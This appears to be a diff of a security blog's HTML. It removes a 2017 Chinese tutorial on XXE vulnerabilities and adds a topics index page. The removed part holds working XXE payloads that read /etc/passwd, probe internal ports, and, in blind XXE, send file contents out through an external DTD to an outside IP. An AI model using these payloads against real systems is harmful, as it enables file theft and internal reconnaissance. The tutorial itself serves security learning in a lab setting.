@@ -3,9 +3,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XXE漏洞 - Reber's Blog</title>
+    <title>Topics - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,python,php,linux">
-    <meta name="description" content="XXE漏洞是针对使用XML交互的Web应用程序的攻击方法">
+    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
     <meta name="author" content="reber">
 
     
@@ -78,211 +78,165 @@
 
     <div class="main">
         <div class="left">
-            <div>
-                <h2>XXE漏洞</h2>
+            
+            <h2>2018</h2>
+            <ul>
                 
-                <div class="post-meta">
-                    <div style="padding:5px 5px 2px 5px;">
-                        <i class="fa fa-calendar fa-fw"></i>
-                        <time>2017-12-09</time>
-                        &nbsp;&nbsp;&nbsp;&nbsp;
-                    
-
-                    
-
-                    
-                        
-                        
-                        
-                            <i class="fa fa-folder fa-fw"></i>
-                            
-                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                            
-                        
-                        
-                        &nbsp;&nbsp;&nbsp;&nbsp;
-                        
-                        
-                        
-                            <i class="fa fa-tags fa-fw"></i>
-                            
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xml">xml</a>
-                            
-                        
-                        
-                    </div>
-                </div>
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/pentest/">Pentest</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2018-05-23 11:14
+            
+        </time>
+    </div>
+</li>
                 
-            </div>
-            <div class="content">
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/php/">Php</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2018-04-16 19:16
+            
+        </time>
+    </div>
+</li>
                 
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/python/">Python</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2018-01-29 16:45
+            
+        </time>
+    </div>
+</li>
                 
-
-<h3 id="0x00-xxe">0x00 XXE</h3>
-
-<p>XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛</p>
-
-<p>外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法</p>
-
-<h3 id="0x01-示例代码">0x01 示例代码</h3>
-
-<p>实验环境：<a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe?_blank">https://github.com/vulhub/vulhub/tree/master/php/php_xxe</a><br />
-simplexml_load_string.php</p>
-
-<pre><code>&lt;?php
-$data = file_get_contents('php://input');
-$xml = simplexml_load_string($data);
-echo $xml-&gt;name;
-</code></pre>
-
-<h3 id="0x02-读取文件">0x02 读取文件</h3>
-
-<ul>
-<li>内部声明实体</li>
-</ul>
-
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xdsec [
-  &lt;!ELEMENT name ANY &gt;
-  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
-]&gt;
-&lt;root&gt;
-  &lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre>
-
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xdsec [
-  &lt;!ELEMENT name ANY &gt;
-  &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;
-]&gt;
-&lt;root&gt;
-  &lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre>
-
-<ul>
-<li>引用外部实体</li>
-</ul>
-
-<p>evil.dtd中的内容为：<code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
-
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xdsec [
-  &lt;!ELEMENT name ANY &gt;
-  &lt;!ENTITY % xxe SYSTEM &quot;http://114.115.183.86/evil.dtd&quot;&gt;
-  %xxe;
-]&gt;
-&lt;root&gt;
-  &lt;name&gt;&amp;b;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre>
-
-<h3 id="0x03-端口探测">0x03 端口探测</h3>
-
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xdsec [
-  &lt;!ENTITY http SYSTEM 'http://10.11.11.20:3306/'&gt;
-]&gt;
-&lt;root&gt;
-  &lt;name&gt;&amp;http;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre>
-
-<h3 id="0x04-blind-xxe">0x04 Blind-XXE</h3>
-
-<ul>
-<li>方法一：</li>
-</ul>
-
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xdsec [
-    &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/issue&quot;&gt;
-    &lt;!ENTITY % remote SYSTEM &quot;http://114.115.183.86/wyb/evil.dtd&quot;&gt;
-    %remote;
-    %send;
-]&gt;
-</code></pre>
-
-<p>evil.dtd内容：</p>
-
-<pre><code>&lt;!ENTITY % all
-&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://114.115.183.86/?%file;'&gt;&quot;
-&gt;
-%all;
-</code></pre>
-
-<ul>
-<li>方法二：</li>
-</ul>
-
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xdsec [
-    &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/hosts&quot;&gt;
-    &lt;!ENTITY % remote SYSTEM &quot;http://114.115.183.86/wyb/evil.xml&quot;&gt;
-    %remote;   &lt;!--引用remote来将外部文件evil.xml引入到解释上下文中--&gt;
-    %xxe;   &lt;!--执行%xxe，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发--&gt;
-]&gt;
-&lt;root&gt;&amp;send;&lt;/root&gt;
-</code></pre>
-
-<p>evil.xml内容：</p>
-
-<pre><code>&lt;!ENTITY % xxe &quot;&lt;!ENTITY send SYSTEM 'http://114.115.183.86/a.php?content=%file;'&gt;&quot;&gt;
-</code></pre>
-
-<p><br></p>
-
-<h4 id="reference-侵删">Reference(侵删)：</h4>
-
-<ul>
-<li><a href="http://blog.csdn.net/u011721501/article/details/43775691?_blank">http://blog.csdn.net/u011721501/article/details/43775691</a></li>
-<li><a href="https://security.tencent.com/index.php/blog/msg/69?_blank">https://security.tencent.com/index.php/blog/msg/69</a></li>
-</ul>
-
+            </ul>
+            
+            <h2>2017</h2>
+            <ul>
                 
-                <div style="padding:10px 1px;">
-                    <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
-                    <script>
-                        var link = decodeURI(window.location.href);
-                        var url = '<a href="' + link + '">'+link+'</a>';
-                        document.write(url);
-                    </script>
-                </div>
-
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/server/">Server</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2017-10-28 13:58
+            
+        </time>
+    </div>
+</li>
                 
-<div class="prev-next-post pure-g">
-  <div class="pure-u-1-24" style="text-align: left;">
-    
-    <a href="http://wyb0.com/posts/middleware-security-configuration/"><i class="fa fa-chevron-left"></i></a>
-    
-  </div>
-  <div class="pure-u-10-24">
-    
-    <nav class="prev">
-      <a href="http://wyb0.com/posts/middleware-security-configuration/">中间件安全配置</a>
-    </nav>
-    
-  </div>
-  <div class="pure-u-2-24">
-    &nbsp;
-  </div>
-  <div class="pure-u-10-24">
-    
-    <nav class="next">
-      <a href="http://wyb0.com/posts/package-and-download-the-php-file/">打包下载php文件</a>
-    </nav>
-    
-  </div>
-  <div class="pure-u-1-24" style="text-align: right;">
-    
-    <a href="http://wyb0.com/posts/package-and-download-the-php-file/"><i class="fa fa-chevron-right"></i></a>
-    
-  </div>
-</div>
-
-
-            </div>
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/linux/">Linux</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2017-09-19 10:35
+            
+        </time>
+    </div>
+</li>
+                
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/other/">Other</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2017-08-01 18:16
+            
+        </time>
+    </div>
+</li>
+                
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/javascript/">Javascript</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2017-06-22 15:18
+            
+        </time>
+    </div>
+</li>
+                
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/database/">Database</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2017-05-30 13:16
+            
+        </time>
+    </div>
+</li>
+                
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/git/">Git</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2017-01-16 20:18
+            
+        </time>
+    </div>
+</li>
+                
+            </ul>
+            
+            <h2>2016</h2>
+            <ul>
+                
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/miscellanea/">Miscellanea</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2016-09-21 23:05
+            
+        </time>
+    </div>
+</li>
+                
+                    <li>
+    <div class="pure-u-16-24">
+        <a href="http://wyb0.com/topics/windows/">Windows</a>
+    </div>
+    <div class="pure-u-5-24">
+        <time>
+            
+                2016-07-24 21:33
+            
+        </time>
+    </div>
+</li>
+                
+            </ul>
+            
         </div>
         <div class="right">
             <div>
@@ -622,7 +576,7 @@ echo $xml-&gt;name;
         </div>
     </div>
 
-    <br>
+    <br><br><br>
     
 <div class="foot">
     <div class="copyright">
@@ -723,5 +677,4 @@ echo $xml-&gt;name;
 
 </body>
 </html>
-
 
